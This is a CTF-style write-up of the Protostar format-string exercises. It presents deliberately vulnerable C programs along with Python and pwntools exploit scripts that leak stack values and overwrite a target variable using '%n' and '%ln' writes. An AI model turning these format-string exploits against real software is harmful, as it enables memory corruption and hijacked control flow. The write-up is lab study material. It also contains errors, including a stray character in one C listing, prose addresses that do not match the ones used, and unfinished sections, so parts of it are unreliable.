# PROTOSTAR EXERCISE - FORMAT STRING

## Fromat 0

This chall is begin of all, source code for this is here.
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln(char *string)
{
  volatile int target;
  char buffer[64];

  target = 0;

  sprintf(buffer, string);
  
  if(target == 0xdeadbeef) {
      printf("you have hit the target correctly :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}

//gcc -o format0 formatzero.c -fno-stack-protector -g -z execstack -W -no-pie

```

We using bug overflow to change value of target to print that string.
Ezz to know that buff size is 64 bytes and we have to overflow that.

........
........
........

## Format 1

For this chall, source code get input from args and using another technology .... Format string bla bla bla 
Source code : 
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln(char *string)
{
  printf(string);
  
  if(target) {
      printf("you have modified the target :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}

//gcc -o format1 formatone.c -fno-stack-protector -g -z execstack -W -no-pie

```
Now we can see bug is in the printf funtion : printf(string);: This is the vulnerable function in this code. The printf() will not check whether the supplied inputs are expected format strings or not. This is because it’s coded to accept any input values at the location where the format parameter is supposed to be. So what we can do is simply to verify if we can leak the memory addresses and also write arbitrary values onto the stack ([READ] %p or %x → [WRITE] %n).
We find add of target by cmd : objdump -t format1 | grep target
Finding offset of printf : 
```

```
After that we have exploit code : 
```
#!/usr/bin/python
import os


egg = "\x38\x96\x04\x08"  
hex_egg = egg.encode("utf-8").hex()

def desc():
  print('[+] Running Simple Format String Spraying...')
  print('[+] Setting Egg: ', hex_egg)


def spraying():
  i = 1
  while i < 200:
    c = int(i)
    p = './format1 ' + egg + ("%p" * c) + "%p"
    out = os.popen(p).read()
    s = str(out)
  
    if hex_egg in s:
      print('[+] Egg found! ...{0}'.format(out[-30:]))
      print('[+] Found Offset: {0}'.format(i))
      return i
      break  
    else:
      i += 1
      continue
  


def win(i):
  offset = i
  p = './format1 ' 
  p+= egg 
  p+= ("%p" * offset) 
  p+= "%n"   
  out = os.popen(p).read()
  s = str(out)
  if "target" in s:
    print('[+] Winning Statement: {0}'.format(out[-32:]))
    exit(0) 
  else:
    print('[-] Something Went Wrong...')
    exit(1)

if __name__ == "__main__":
  desc()
  i = spraying()
  print(i)
  win(i)

```



We done!


## Format 2

In this chall is uplevel moreee !
We read and build source code for this challenge.
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;



void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);s
  printf(buffer);
  
  if(target == 64) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %d :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}

//gcc -m32 -o format2 formattwo.c -fno-stack-protector -g -z execstack -W -no-pie


```

We note something: 

  + Bug is printf funtion
  + target == 64 to pass
  + Input in buf

That mean we have to finding offset by this way.
```
┌──(kali㉿kali)-[~/Pwn/Protostar/Format2]
└─$ ./format2                                                                                                 130 ⨯
ABCDEFGH|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx
ABCDEFGH|200|f7eb4580|8049191|44434241|48474645|786c257c|786c257c|786c257c|786c257c|786c257c|786c257c
target is 0 :(

```
We find offset = 4

Find target address
```
┌──(kali㉿kali)-[~/Pwn/Protostar/Format2]
└─$ objdump -t format2 |grep target
0804c028 g     O .bss   00000004              target
```



So we can write this exloit ;
```
from pwn import * 

BIN = "./format2"

target = 0x0804c028


def exploit():
	payload = p32(target) + b"%60d" + b"%4$ln"
	io.sendline(payload)
	io.interactive()

io = process(BIN)
exploit()


# ABCDEFGH|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx
#objdump -t format2 |grep target 000000000060105c

# python2 -c 'print "\x5c\x10\x60\x00\x00\x00\x00\x00" + "%6$ln"' | ./format

```
When using payload = p32(target) + b"%4$ln" this program return target is 4 :( is mean we change target from 0 to 4 by 4 bytes of address target. That mean we have to write 60 bytes to enought.

## Format 3

Uplevel++ :< This more hard and more complicated
Source code for this:
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void printbuffer(char *string)
{
  printf(string);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printbuffer(buffer);
  
  if(target == 0x01025544) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %08x :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}


//gcc -m32 -o format formatthree.c -fno-stack-protector -g -z execstack -W -no-pie

```

Same thing with previous chall but value of target have change target == 0x01025544 ... That is a big number but is nothing we can using old way to solve this problem 
```
from pwn import * 

BIN = "./format"

target = 0x0804c028


def exploit():
	payload = p32(target) + b"%16930112d" + b"%12$ln"
	io.sendline(payload)
	io.interactive()

io = process(BIN)
exploit()


#ABCD%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x
```
And maybe we have another way. We can be write to 2 bytes 
From the above representation, obviously now the target doesn’t have any value written; however, the 4 byte hex location (0x00000000) is where we need to replace with 0x01025544.

So for the 2-byte-write method, we will need to utilize the addresses: 0x80496f4 and 0x80496f6.
```
0x01025544    <-- Desired value & divide this into 2
    ⬇  
  0x0102      <-- We will write this on address starting from "28"
  0x5544      <-- We will write this on address starting from "f6"
  
 ```
 
 
 ```
 from pwn import * 

BIN = "./format"

target = 0x0804c028
target1 = 0x0804c028 + 2


def exploit():
	payload = p32(target) + p32(target1) + b"%21820d%12$ln" + b"%43966d%13$ln"
	io.sendline(payload)
	io.interactive()

io = process(BIN)
exploit()


#ABCD%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x
```


to sovle this chall



## Format 4

Last chall of this technology
Source code :
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void hello()
{
  printf("code execution redirected! you win\n");
  _exit(1);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printf(buffer);

  exit(1);  
}

int main(int argc, char **argv)
{
  vuln();
}


//gcc -m32 -o format formatfour.c -fno-stack-protector -g -z execstack -W -no-pie

```
